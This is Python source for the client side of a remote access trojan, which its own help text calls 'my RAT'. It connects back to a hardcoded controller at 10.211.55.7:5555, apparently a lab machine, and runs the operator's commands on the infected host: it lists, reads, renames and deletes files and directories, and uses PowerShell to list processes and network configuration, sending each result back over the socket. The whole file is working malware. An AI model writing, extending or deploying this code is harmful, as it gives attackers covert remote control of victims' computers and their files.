
import socket
import subprocess
import os
import re
import colorama


class ClientClass:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.cur_dir = os.getcwd()
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "\n\n"

    def connection(self):
        try:
            global client
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.ip, self.port))
            first_massage = f'\n{self.cur_dir}>> '
            client.send(first_massage.encode())
        except Exception as error:
            print(error)

    def c_exe(self):
        while True:
            # receive the commands
            command = client.recv(self.BUFFER_SIZE).decode()
            split_command = command.split()

            if split_command[0].lower() == "exit":
                client.close()

            elif split_command[0].lower() == "man" or split_command[0].lower() == "--help":
                output = f"""
                man page for my RAT:
                {colorama.Fore.LIGHTRED_EX}
                exit - Exit Shell
                cd - Change Directory
                rn - Rename File/Directory
                rm - Remove File
                mkdir - Make Directory
                rmdir - Remove Directory
                ls - List Directory
                pwd - Working Directory
                cat - Show file content
                proclist - PowerShell Get-Process output 
                {colorama.Fore.WHITE}
                """
            elif split_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(split_command[1:]))
                except Exception as error:
                    # if there is an error, set as the output
                    output = str(error)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif split_command[0].lower() == "rn":

                tgt_file = ''.join(split_command[1])
                new_name = ''.join(split_command[2])

                try:
                    os.rename(tgt_file, new_name)
                except Exception as error:
                    output = str(error)
                else:
                    output = ""

            elif split_command[0].lower() == "ls" and not split_command[1:]:
                execute = os.listdir()
                string = ' '.join(execute)
                reg = re.sub("\s", "\n", string)
                output = reg

            elif split_command[0].lower() == "pwd" and not split_command[1:]:
                output = os.getcwd()

            elif split_command[0].lower() == "rm":
                try:
                    os.remove(''.join(split_command[1:]))
                except Exception as error:
                    output = str(error)
                else:
                    output = ''

            elif split_command[0].lower() == "mkdir":
                os.mkdir(''.join(split_command[1:]))
                output = ""

            elif split_command[0].lower() == "rmdir":
                try:
                    os.rmdir(''.join(split_command[1:]))
                except Exception as error:
                    output = str(error)
                else:
                    output = ''

            elif split_command[0].lower() == "cat":
                y = ' '.join(split_command[1:])
                try:
                    with open(y) as f:
                        x = f.readlines()
                        c = ' '.join(x)
                        r = re.sub("\n", "\n", c)
                        output = r
                except Exception as error:
                    output = str(error)

            elif split_command[0].lower() == "proclist":
                if not split_command[1:]:
                    output = subprocess.check_output(['powershell.exe',
                                                      'Get-Process'],
                                                     encoding='utf-8')

                elif split_command[1] == "-pid":
                    output = subprocess.check_output(['powershell.exe',
                                                      'Get-Process',
                                                      '-PID',
                                                      ''.join(split_command[2:])],
                                                     encoding='utf-8')

                else:
                    output = "Hint: proclist -pid <process id> "
            elif split_command[0].lower() == "ip":
                if not split_command[1:]:
                    output = subprocess.check_output(['powershell.exe',
                                                      'ipconfig'],
                                                     encoding='utf-8')
                elif split_command[1] == "a":
                    output = subprocess.check_output(['powershell.exe',
                                                      'ipconfig',
                                                      '/all'],
                                                     encoding='utf-8')
                else:
                    output = "Hint: ip/ip a"

            else:
                # execute the command and retrieve the results
                # output = subprocess.getoutput(command)
                output = f"{command} Is Not A Valid Command, Try man/--help To See More Details."

            # get current working directory
            cwd = os.getcwd()
            # send the results to C2
            message = f"{output}{self.SEPARATOR}{cwd}>> "
            client.send(message.encode())
        # close client connection
        client.close()


rat = ClientClass('10.211.55.7', 5555)


if __name__ == '__main__':
    rat.connection()
    rat.c_exe()
